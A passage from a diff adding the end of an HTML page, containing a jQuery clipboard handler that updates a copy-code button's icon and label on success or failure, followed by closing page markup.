+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
